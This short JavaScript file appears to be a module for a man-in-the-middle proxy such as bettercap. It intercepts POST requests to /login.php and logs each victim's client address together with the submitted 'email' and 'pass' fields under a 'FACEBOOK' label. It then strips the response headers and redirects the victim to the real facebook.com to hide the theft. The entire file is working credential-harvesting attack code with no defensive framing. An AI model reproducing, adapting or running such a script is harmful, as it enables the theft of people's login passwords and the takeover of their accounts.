var RESET = "\033[0m";

function R(s) {
    return "\033[31m" + s + RESET;
}

function B(s) {
    return "\033[34m" + s + RESET;
}

function onRequest(req, res) {
    if( req.Method == "POST" && req.Path == "/login.php" && req.ContentType == "application/x-www-form-urlencoded" ) {
        var form = req.ParseForm();
        var email = form["email"] || "?", 
            pass  = form["pass"] || "?";

        log( R(req.Client), " > FACEBOOK > email:", B(email), " pass:'" + B(pass) + "'" );

        for (var i = 0; i < res.Headers.length; i++) {
            res.RemoveHeader(res.Headers[i].Name)
        }
        res.Status = 301;
        res.SetHeader("Location", "https://www.facebook.com")
        res.SetHeader("Connection", "close")
    }
}
